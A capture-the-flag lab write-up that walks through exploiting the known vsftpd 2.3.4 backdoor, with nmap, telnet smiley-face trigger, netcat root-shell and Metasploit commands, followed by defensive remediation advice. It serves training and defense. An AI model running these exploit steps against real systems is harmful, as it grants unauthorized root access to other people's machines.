




HackerDNA Lab Writeup: Anonymous 2


Difficulty: Easy


https://hackerdna.com/labs/anonymous-2

Core Concepts: Service Enumeration, Banner Grabbing, Exploiting Known Backdoors, Port Triggering.

Phase 1: Reconnaissance & Fingerprinting
In this lab, the description gives us a heavy hint: "compromised official distribution." We need to identify exactly what version of the FTP service is running.

1. Port Scanning
Start with an Nmap scan to identify open ports and service versions.

Bash

nmap -sV <TARGET_IP>
Expected Output:
The scan should reveal Port 21 running vsftpd 2.3.4.

2. Identifying the Backdoor
A quick search for "vsftpd 2.3.4 exploit" reveals that this specific version was famously compromised in 2011. The attackers added a backdoor that triggers a root shell on Port 6200 if a username ending in a smiley face :) is provided during login.

Phase 2: Triggering the Backdoor
The exploit is unique because it is "triggered" via Port 21 but "delivered" via a newly opened port.

1. Send the Trigger
Use telnet or ftp to connect to the target. You do not need a real password.

Bash

telnet <TARGET_IP> 21
When prompted for a name, enter any string followed by :):

USER: hacker:)

PASS: anything

The connection will likely hang or close. This is normal; the "smiley face" username has just signaled the malicious code to spawn a shell listener on Port 6200.

Phase 3: Gaining Remote Access
Now that the backdoor is active, we simply connect to the new port.

1. Connect to the Backdoor Port
Use netcat (nc) to connect to the secret listener:

Bash

nc -v <TARGET_IP> 6200
2. Verify Root Access
If successful, you will not see a prompt. Type a command to verify your identity:

Bash

whoami
# Output: root
Phase 4: Capturing the Flags
Since you have immediate root access, you can navigate the entire file system.

1. Capture the User Flag
Search the /home directory for the user's flag.

Bash

cat /home/*/flag-user.txt
Result: HDNA{REDACTED_USER_FLAG}

2. Capture the Root Flag
Go straight to the root's home directory.

Bash

cat /root/flag-root.txt
Result: HDNA{REDACTED_ROOT_FLAG}

Automating with Metasploit (Optional)
If you prefer using a framework, Metasploit has a dedicated module for this:

msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS <TARGET_IP>

exploit

Defensive Remediation: Lessons Learned
Software Integrity: Always verify the checksum (MD5/SHA256) of software downloaded from the internet against the official developer's records to ensure it hasn't been tampered with.

Patch Management: This version of vsftpd is over a decade old. Ensure all internet-facing services are updated to the latest stable versions.

Egress/Ingress Filtering: A properly configured firewall should block unusual ports like 6200. If Port 6200 had been blocked, the backdoor would have been useless to an outside attacker.

Intrusion Detection: Monitor for "smiley face" patterns in FTP logs, as this is a signature indicator of an attempted vsftpd 2.3.4 exploit.
